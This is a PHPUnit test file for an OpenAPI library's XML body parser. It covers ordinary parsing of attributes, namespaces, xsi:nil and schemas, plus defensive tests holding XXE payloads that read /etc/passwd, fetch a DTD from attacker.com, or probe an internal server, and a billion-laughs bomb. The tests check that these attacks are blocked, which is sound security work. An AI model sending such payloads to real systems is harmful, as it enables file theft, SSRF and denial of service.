<?php

declare(strict_types=1);

namespace Duyler\OpenApi\Test\Unit\Validator\Request\BodyParser;

use Duyler\OpenApi\Schema\Model\Schema;
use Duyler\OpenApi\Schema\Model\Xml;
use Duyler\OpenApi\Test\Support\RecordingEventDispatcher;
use Duyler\OpenApi\Validator\Exception\BodyTooLargeException;
use Duyler\OpenApi\Validator\Request\BodyParser\XmlBodyParser;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

use function file_put_contents;
use function is_array;
use function is_string;
use function sprintf;
use function str_repeat;
use function sys_get_temp_dir;
use function tempnam;
use function uniqid;
use function unlink;

use const LIBXML_NOENT;
use const LIBXML_NOERROR;
use const LIBXML_NONET;
use const LIBXML_NOWARNING;

/** @internal */
final class XmlBodyParserTest extends TestCase
{
    private XmlBodyParser $parser;

    protected function setUp(): void
    {
        $this->parser = new XmlBodyParser();
    }

    #[Test]
    public function xxe_external_entity_blocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XML;

        $result = $this->parser->parse($xxePayload);

        if (is_array($result)) {
            $this->assertStringNotContainsString('root:', (string) ($result['root'] ?? ''));
            $this->assertStringNotContainsString('/bin/bash', (string) ($result['root'] ?? ''));
        } elseif (is_string($result)) {
            $this->assertStringNotContainsString('root:', $result);
            $this->assertStringNotContainsString('/bin/bash', $result);
        } else {
            $this->assertNull($result);
        }
    }

    #[Test]
    public function xxe_parameter_entity_blocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
XML;

        $result = $this->parser->parse($xxePayload);

        if (is_array($result)) {
            $this->assertArrayNotHasKey('xxe', $result);
        }

        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function billion_laughs_attack_handled(): void
    {
        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
XML;

        $memoryBefore = memory_get_usage();
        $result = $this->parser->parse($billionLaughs);
        $memoryAfter = memory_get_usage();
        $memoryIncrease = $memoryAfter - $memoryBefore;

        $this->assertLessThan(10 * 1024 * 1024, $memoryIncrease, 'Billion laughs attack should not cause memory exhaustion');
        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function valid_xml_parsed_correctly(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>John Doe</name>
    <email>john@example.com</email>
    <age>30</age>
</user>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('name', $result);
        $this->assertArrayHasKey('email', $result);
        $this->assertArrayHasKey('age', $result);
        $this->assertSame('John Doe', $result['name']);
        $this->assertSame('john@example.com', $result['email']);
        $this->assertSame('30', $result['age']);
    }

    #[Test]
    public function empty_xml_returns_empty_string(): void
    {
        $result = $this->parser->parse('');

        $this->assertSame('', $result);
    }

    #[Test]
    public function whitespace_only_returns_empty_string(): void
    {
        $result = $this->parser->parse('   ');

        $this->assertSame('', $result);
    }

    #[Test]
    public function invalid_xml_returns_raw_body(): void
    {
        $invalidXml = '<root><unclosed>';

        $result = $this->parser->parse($invalidXml);

        $this->assertSame($invalidXml, $result);
    }

    #[Test]
    public function nested_xml_parsed_correctly(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<company>
    <department name="Engineering">
        <employee>
            <name>Alice</name>
            <role>Developer</role>
        </employee>
    </department>
</company>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('department', $result);
    }

    #[Test]
    public function xml_with_attributes_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<user id="123" status="active">
    <name>John</name>
</user>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('name', $result);
        $this->assertSame('John', $result['name']);
    }

    #[Test]
    public function xml_attributes_preserved_with_at_prefix(): void
    {
        $xml = '<user active="true"><name>John</name><nickname/></user>';

        $result = $this->parser->parse($xml);

        $this->assertSame(
            ['@active' => 'true', 'name' => 'John', 'nickname' => ''],
            $result,
        );
    }

    #[Test]
    public function repeated_child_elements_collected_into_numeric_indexed_array(): void
    {
        $xml = '<list><item>a</item><item>b</item></list>';

        $result = $this->parser->parse($xml);

        $this->assertSame(['item' => ['a', 'b']], $result);
    }

    #[Test]
    public function three_or_more_empty_elements_collected_into_flat_numeric_array(): void
    {
        $result = $this->parser->parse('<list><item/><item/><item/></list>');

        self::assertSame(['item' => ['', '', '']], $result);
    }

    #[Test]
    public function root_text_element_returned_as_string(): void
    {
        $result = $this->parser->parse('<a>text</a>');

        $this->assertSame('text', $result);
    }

    #[Test]
    public function empty_element_returned_as_empty_string(): void
    {
        $result = $this->parser->parse('<empty/>');

        $this->assertSame('', $result);
    }

    #[Test]
    public function whitespace_only_root_text_is_preserved_untrimmed(): void
    {
        $result = $this->parser->parse('<root>  </root>');

        $this->assertSame('  ', $result);
    }

    #[Test]
    public function xsi_nil_with_alternative_prefix_is_null(): void
    {
        $result = $this->parser->parse(
            '<product>'
            . '<related xmlns:x="http://www.w3.org/2001/XMLSchema-instance" x:nil="true"/></product>',
        );

        $this->assertSame(['related' => null], $result);
    }

    #[Test]
    public function xsi_nil_root_element_returned_as_null(): void
    {
        $result = $this->parser->parse(
            '<empty xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="true"/>',
        );

        $this->assertNull($result);
    }

    #[Test]
    public function xsi_nil_child_element_returned_as_null(): void
    {
        $result = $this->parser->parse(
            '<product>'
            . '<related xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="true"/></product>',
        );

        $this->assertSame(['related' => null], $result);
    }

    #[Test]
    public function xsi_nil_numeric_one_form_returned_as_null(): void
    {
        $result = $this->parser->parse(
            '<product>'
            . '<related xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="1"/></product>',
        );

        $this->assertSame(['related' => null], $result);
    }

    #[Test]
    public function nil_attribute_without_xsi_namespace_is_not_null(): void
    {
        $result = $this->parser->parse(
            '<product xmlns:x="urn:other" x:nil="true"/>',
        );

        $this->assertSame(['@x:nil' => 'true'], $result);
    }

    #[Test]
    public function mixed_content_text_preserved_in_text_key(): void
    {
        $xml = '<mixed attr="1">hello<child>x</child></mixed>';

        $result = $this->parser->parse($xml);

        $this->assertSame(
            ['@attr' => '1', 'child' => 'x', '#text' => 'hello'],
            $result,
        );
    }

    #[Test]
    public function xxe_ssrf_blocked(): void
    {
        $xxeSsrf = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/secret">
]>
<root>&xxe;</root>
XML;

        $result = $this->parser->parse($xxeSsrf);

        if (is_array($result)) {
            $this->assertStringNotContainsString('secret', (string) ($result['root'] ?? ''));
        } elseif (is_string($result)) {
            $this->assertStringNotContainsString('secret', $result);
        } else {
            $this->assertNull($result);
        }
    }

    #[Test]
    public function xml_with_cdata_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<message>
    <content><![CDATA[<script>alert('xss')</script>]]></content>
</message>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('content', $result);
    }

    #[Test]
    public function xxe_no_file_disclosure(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
XML;

        $result = $this->parser->parse($xxePayload);

        $resultString = is_array($result) ? json_encode($result) : $result;
        $this->assertStringNotContainsString('root:x:0:0', $resultString ?: '');
        $this->assertStringNotContainsString('/bin/bash', $resultString ?: '');
    }

    #[Test]
    public function xml_with_only_text_content(): void
    {
        $xml = '<?xml version="1.0" encoding="UTF-8"?><root>simple text content</root>';

        $result = $this->parser->parse($xml);

        $this->assertSame('simple text content', $result);
    }

    #[Test]
    public function xml_with_mixed_content(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    text before
    <child>child content</child>
    text after
</parent>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_with_numeric_values(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <int>42</int>
    <float>3.14</float>
    <string>hello</string>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('int', $result);
        $this->assertArrayHasKey('float', $result);
        $this->assertArrayHasKey('string', $result);
    }

    #[Test]
    public function xml_with_empty_elements(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <empty></empty>
    <selfclosing/>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_special_characters_handled(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ampersand>&amp;</ampersand>
    <lessthan>&lt;</lessthan>
    <greaterthan>&gt;</greaterthan>
    <quote>&quot;</quote>
    <apostrophe>&apos;</apostrophe>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function deeply_nested_xml_handled(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<level1>
    <level2>
        <level3>
            <level4>
                <level5>deep value</level5>
            </level4>
        </level3>
    </level2>
</level1>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_with_unicode_content(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <chinese>中文测试</chinese>
    <emoji>😀🎉</emoji>
    <russian>Привет мир</russian>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('chinese', $result);
        $this->assertArrayHasKey('emoji', $result);
        $this->assertArrayHasKey('russian', $result);
    }

    #[Test]
    public function xml_with_duplicate_element_names(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>Alice</user>
    <user>Bob</user>
    <user>Charlie</user>
</users>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_declares_wrong_encoding_returns_raw(): void
    {
        $xml = '<?xml version="1.0" encoding="UTF-8"?><root>' . "\xFF\xFE" . '</root>';

        $result = $this->parser->parse($xml);

        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function xml_with_namespace_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:ns="http://example.com">
    <ns:element>namespaced content</ns:element>
</root>
XML;

        $result = $this->parser->parse($xml);

        $this->assertTrue(is_array($result) || is_string($result) || null === $result);
    }

    #[Test]
    public function xxe_doctype_with_etc_passwd_not_substituted(): void
    {
        $xxePayload = <<<'XML'
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>&xxe;</name></root>
XML;

        $result = $this->parser->parse($xxePayload);

        if (is_array($result)) {
            $nameValue = (string) ($result['name'] ?? '');
            $this->assertStringNotContainsString('root:x:0:0', $nameValue);
            $this->assertStringNotContainsString('/bin/bash', $nameValue);
        } else {
            $this->assertStringNotContainsString('root:x:0:0', $result);
            $this->assertStringNotContainsString('/bin/bash', $result);
        }
    }

    #[Test]
    public function simple_xml_parses_to_associative_array(): void
    {
        $result = $this->parser->parse('<root><name>John</name></root>');

        $this->assertIsArray($result);
        $this->assertArrayHasKey('name', $result);
        $this->assertSame('John', $result['name']);
    }

    #[Test]
    public function libxml_internal_errors_state_restored_after_parse(): void
    {
        libxml_use_internal_errors(false);

        $this->parser->parse('<root><name>John</name></root>');

        $this->assertFalse(libxml_use_internal_errors());
    }

    #[Test]
    public function deny_all_loader_blocks_file_resolution_even_with_noent_flag(): void
    {
        $secretContent = 'XXE_SECRET_' . uniqid('', true);
        $tempFile = tempnam(sys_get_temp_dir(), 'xxe_noent_');

        $this->assertNotFalse($tempFile);
        file_put_contents($tempFile, $secretContent);

        try {
            $xxePayload = sprintf(
                '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://%s"> ]><root><name>&xxe;</name></root>',
                $tempFile,
            );

            $previousInternalErrors = libxml_use_internal_errors(true);
            libxml_set_external_entity_loader(static fn(): null => null);

            try {
                $xml = simplexml_load_string(
                    $xxePayload,
                    options: LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT,
                );
                $encoded = false === $xml ? '' : (string) json_encode($xml);
            } finally {
                libxml_clear_errors();
                libxml_use_internal_errors($previousInternalErrors);
            }

            $this->assertStringNotContainsString(
                $secretContent,
                $encoded,
                'deny-all loader must prevent file:// entity resolution even with LIBXML_NOENT flag',
            );
        } finally {
            unlink($tempFile);
        }
    }

    #[Test]
    public function preserves_namespaced_attributes(): void
    {
        $xml = '<root xmlns:atom="http://www.w3.org/2005/Atom"><atom:link href="https://example.com/feed"/></root>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('atom:link', $result);
        $linkValue = $result['atom:link'];
        $this->assertIsArray($linkValue);
        $this->assertSame('https://example.com/feed', $linkValue['@href']);
    }

    #[Test]
    public function preserves_default_namespace_children(): void
    {
        $xml = '<root xmlns="http://example.com/ns"><item>value</item></root>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('item', $result);
        $this->assertSame('value', $result['item']);
    }

    #[Test]
    public function preserves_mixed_namespaced_and_default_elements(): void
    {
        $xml = '<root xmlns="http://example.com/ns" xmlns:atom="http://www.w3.org/2005/Atom">'
            . '<title>default-title</title>'
            . '<atom:link href="https://example.com/feed"/>'
            . '</root>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('title', $result);
        $this->assertSame('default-title', $result['title']);
        $this->assertArrayHasKey('atom:link', $result);
        $this->assertIsArray($result['atom:link']);
        $this->assertSame('https://example.com/feed', $result['atom:link']['@href']);
    }

    #[Test]
    public function preserves_namespaced_attributes_with_prefix(): void
    {
        $xml = '<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="string"/>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('@xsi:type', $result);
        $this->assertSame('string', $result['@xsi:type']);
    }

    #[Test]
    public function preserves_repeated_namespaced_children_as_numeric_array(): void
    {
        $xml = '<feed xmlns:atom="http://www.w3.org/2005/Atom">'
            . '<atom:link href="https://a.example.com"/>'
            . '<atom:link href="https://b.example.com"/>'
            . '</feed>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('atom:link', $result);
        $this->assertIsArray($result['atom:link']);
        $this->assertArrayHasKey(0, $result['atom:link']);
        $this->assertArrayHasKey(1, $result['atom:link']);
        $this->assertSame('https://a.example.com', $result['atom:link'][0]['@href']);
        $this->assertSame('https://b.example.com', $result['atom:link'][1]['@href']);
    }

    #[Test]
    public function product_with_nulls_fixture_maps_xsi_nil_and_omitted_attribute_to_null(): void
    {
        $xml = <<<'XML_WRAP'
        <product>
            <description>Thing</description>
            <related xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="true"/>
        </product>
        XML_WRAP;

        $result = $this->parser->parse($xml, $this->productSchema());

        $this->assertSame(
            ['count' => null, 'description' => 'Thing', 'related' => null],
            $result,
        );
    }

    #[Test]
    public function product_without_nulls_fixture_keeps_empty_element_not_null(): void
    {
        $xml = '<product count="42"><description>Thing</description><related></related></product>';

        $result = $this->parser->parse($xml, $this->productSchema());

        $this->assertIsArray($result);
        $this->assertNotNull($result['related']);
        $this->assertSame(
            ['count' => '42', 'description' => 'Thing', 'related' => []],
            $result,
        );
    }

    #[Test]
    public function omitted_attribute_without_nullable_type_is_omitted(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'count' => new Schema(type: 'number', xml: new Xml(nodeType: 'attribute')),
            'description' => new Schema(type: 'string'),
        ]);

        $result = $this->parser->parse('<product><description>Thing</description></product>', $schema);

        $this->assertSame(['description' => 'Thing'], $result);
    }

    #[Test]
    public function namespaced_property_mapped_by_namespace(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'id' => new Schema(type: 'integer', xml: new Xml(nodeType: 'attribute')),
            'name' => new Schema(
                type: 'string',
                xml: new Xml(namespace: 'https://example.com/schema/sample', prefix: 'sample'),
            ),
        ]);

        $xml = <<<'XML'
<Person id="123">
    <sample:name xmlns:sample="https://example.com/schema/sample">example</sample:name>
</Person>
XML;

        $result = $this->parser->parse($xml, $schema);

        $this->assertSame(['id' => '123', 'name' => 'example'], $result);
    }

    #[Test]
    public function wrapped_array_is_unwrapped_when_unambiguous(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'animals' => new Schema(
                type: 'array',
                xml: new Xml(wrapped: true),
                items: new Schema(type: 'string', xml: new Xml(name: 'animal')),
            ),
        ]);

        $xml = '<document><animals><animal>dog</animal><animal>cat</animal></animals></document>';

        $result = $this->parser->parse($xml, $schema);

        $this->assertSame(['animals' => ['dog', 'cat']], $result);
    }

    #[Test]
    public function ambiguous_wrapped_array_passed_through_with_warning(): void
    {
        $dispatcher = new RecordingEventDispatcher();
        $parser = new XmlBodyParser(eventDispatcher: $dispatcher);
        $schema = new Schema(type: 'object', properties: [
            'animals' => new Schema(
                type: 'array',
                xml: new Xml(wrapped: true),
                items: new Schema(type: 'string', xml: new Xml(name: 'animal')),
            ),
        ]);

        $xml = '<document><animal>dog</animal><animal>cat</animal></document>';

        $result = $parser->parse($xml, $schema);

        $this->assertSame(['animals' => ['dog', 'cat']], $result);
        $this->assertCount(1, $dispatcher->events);
        $this->assertSame('animals', $dispatcher->events[0]->propertyName);
    }

    #[Test]
    public function text_node_property_mapped_from_element_text(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'kind' => new Schema(type: 'string', xml: new Xml(nodeType: 'attribute')),
            'name' => new Schema(type: 'string', xml: new Xml(nodeType: 'text')),
        ]);

        $result = $this->parser->parse('<animal kind="Cat">Fluffy</animal>', $schema);

        $this->assertSame(['kind' => 'Cat', 'name' => 'Fluffy'], $result);
    }

    #[Test]
    public function cdata_node_property_mapped_from_cdata_section(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'content' => new Schema(type: 'string', xml: new Xml(nodeType: 'cdata')),
        ]);

        $result = $this->parser->parse('<doc><![CDATA[<html>bold</html>]]></doc>', $schema);

        $this->assertSame(['content' => '<html>bold</html>'], $result);
    }

    #[Test]
    public function inline_node_type_merges_nested_properties_into_parent(): void
    {
        $schema = new Schema(type: 'object', properties: [
            'meta' => new Schema(
                type: 'object',
                xml: new Xml(nodeType: 'none'),
                properties: [
                    'kind' => new Schema(type: 'string', xml: new Xml(nodeType: 'attribute')),
                ],
            ),
            'title' => new Schema(type: 'string'),
        ]);

        $result = $this->parser->parse('<doc kind="a"><title>t</title></doc>', $schema);

        $this->assertSame(['kind' => 'a', 'title' => 't'], $result);
    }

    #[Test]
    public function malformed_xml_with_schema_still_degrades_to_raw_body(): void
    {
        $invalidXml = '<product><unclosed>';

        $result = $this->parser->parse($invalidXml, $this->productSchema());

        $this->assertSame($invalidXml, $result);
    }

    #[Test]
    public function schema_aware_parse_still_enforces_byte_cap(): void
    {
        $parser = new XmlBodyParser(maxXmlBytes: 16);

        $this->expectException(BodyTooLargeException::class);

        $parser->parse('<product>' . str_repeat('x', 32) . '</product>', $this->productSchema());
    }

    private function productSchema(): Schema
    {
        return new Schema(
            type: 'object',
            xml: new Xml(name: 'product'),
            required: ['count', 'description', 'related'],
            properties: [
                'count' => new Schema(type: ['number', 'null'], xml: new Xml(nodeType: 'attribute')),
                'rating' => new Schema(type: 'string', xml: new Xml(nodeType: 'attribute')),
                'description' => new Schema(type: 'string'),
                'related' => new Schema(type: ['object', 'null']),
            ],
        );
    }
}
